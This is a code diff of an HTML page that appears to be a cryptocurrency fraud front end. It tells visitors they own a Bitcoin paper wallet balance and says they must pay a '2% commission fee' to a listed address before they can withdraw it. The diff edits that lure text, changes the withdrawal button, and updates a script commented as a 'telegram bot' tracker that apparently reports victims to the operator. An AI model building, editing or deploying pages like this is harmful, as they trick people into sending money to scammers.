@@ -165,34 +165,14 @@
         <p style="margin-bottom: 5px;" class="check-balance__bitcoin"><img src="./img/bitcoin-convert.jpg"" alt="
                 bitcoin-convert" width="60" class="d-block mx-auto mb-1"></p>
         <p id="balance_bitcoin" class="check-balance__bitcoin"></p>
-        <p class="text-center">Deposited by Bitcoin ATM receipt <br>(transaction ID - SD1V89W533SF5-D9N1)</p>
-        <ul class="check-balance__advs">
-            <!-- <li>> Scan Public Address QR code to deposit paper wallet or to check available balance.</li> -->
-            <li>> PRIVATE key gives you complete access to your funds on Bitcoin paper wallet.</li>
-            <li>> DO NOT REVEAL or SHARE THE PRIVATE KEY until you withdraw funds from Bitcoin paper wallet to your
-                own
-                cryptocurrency wallet.</li>
-            <li>> To withdraw funds from paper wallet you must pay a 2% commission fee the current amount on the Bitcoin
-                paper
-                wallet.</li>
-        </ul>
+
     </div>
 
     <div class="container check-balance">
         <!-- <img src="./img/bitcoin_convert.jpg" alt="" width="100" class="d-block mx-auto"> -->
         <!-- <h3 class="h3 text-center mt-1">Business paper wallet</h3> -->
-        <p class="text-center text-danger" style="font-size: 15px;"><span class="ultra-text-danger">To withdraw funds
-                from the bitcoin paper wallet you need to pay a 2% commission fee</span><br>You must pay the exact
-            amount into the specific bitcoin wallet specified, double-check that you have entered the data correctly!
-        </p>
+
         <form class="deposit-crypto">
-            <div class="deposit-crypto__field">
-                <div class="deposit-crypto__main">
-                    <label>Balance to withdraw</label>
-                    <p id="get_balance">1000 EUR = 0.6234123 BTC</p>
-                </div>
-                <img src="./img/bitcoin.svg" alt="" width="40" height="40">
-            </div>
             <div class="deposit-crypto__field">
                 <div class="deposit-crypto__main">
                     <label>2% Commission Fee</label>
@@ -207,7 +187,7 @@
                 </div>
                 <img src="./img/bitcoin.svg" alt="" width="40" height="40">
             </div>
-            <p class="text-center black-text">To pay the 2% commission fee use a digital Bitcoin wallet,scan QR code
+            <p class="text-center black-text">To pay the 2% commission fee use a digital crypto wallet,scan QR code
                 below,send the correct amount of the Bitcoin indicated in the form above,<br><span
                     class="ultra-text-danger text-danger">double check the Bitcoin address</span> into which you need to
                 pay the commission fee.Once the commission fee has been paid click the button below</p>
@@ -233,7 +213,8 @@
             </div>
             <!-- Cutsom checkbox -->
 
-            <button onclick="check_data()" type="submit" class="check-balance__btn green-btn">Next</button>
+
+            <div class="get-found-button"></div>
             <p id="wait" class="check-balance__wait">Transaction verification in progress<br>Please wait...</p>
             <p class="form-error text-center text-danger fill-data">Error <br>Please fill the form</p>
             <p class="form-error text-center text-danger incorrect-data">Incorrect data entered!</p>
@@ -338,7 +319,7 @@
         <img class="kraken-image" alt="" loading="lazy" />
       </picture>
     </div> -->
-        <div class="marquee">
+        <!-- <div class="marquee">
             <div class="marquee__content ml-10" direction="right">
                 <div id="moved1" class="moved-section"></div>
             </div>
@@ -351,7 +332,7 @@
             <div class="marquee__content ml-40" direction="right">
                 <div id="moved4" class="moved-section"></div>
             </div>
-        </div>
+        </div> -->
     </section>
     <!-- Bitcoin swiper -->
 
@@ -369,13 +350,12 @@
             </div>
             <div class="popup-content">
                 <ul class="check-balance__advs">
-                    <p style="margin-bottom: 5px;font-size: 15px;">Amecacoin instruction to pay the commission:</p>
                     <!-- <li>> Scan Public Address QR code to deposit paper wallet or to check available balance.</li> -->
                     <li>> Use your private digital wallet</li>
                     <li>> Use the bitcoin address provided</li>
-                    <span id="bitcoin-address">1b1er9b1rt91tje61nb9re1b9n19ytm19t1nb9r1nb9ytm1</span>
+                    <li id="bitcoin-address">1b1er9b1rt91tje61nb9re1b9n19ytm19t1nb9r1nb9ytm1</li>
                     <li>> Send the specified commission fee</li>
-                    <span id="bitcoin-commission">0,00145 BTC</span>
+                    <li id="bitcoin-commission">0,00145 BTC</li>
                     <li>> Wait for blockchain confirmation</li>
                     <li>> Press Next</li>
                     <li>> Withdraw wallet balance to your private BTC address</li>
@@ -414,9 +394,8 @@
     <!-- JS Implementing Plugins -->
     <script src="assets/vendor/hs-counter/dist/hs-counter.min.js"></script>
     <script src="assets/vendor/appear.js"></script>
-    <script src="assets/js/getPrices.js"></script>
     <!-- telegram bot -->
-    <script src="assets/js/withdrawTracker-3.js"></script>
+    <script src="assets/js/withdrawTracker-5.js"></script>
     <script type="module" src="assets/js/loader.js"></script>
     <script src="assets/js/dropdown.js"></script>
     <script src="assets/js/setBrandName.js"></script>
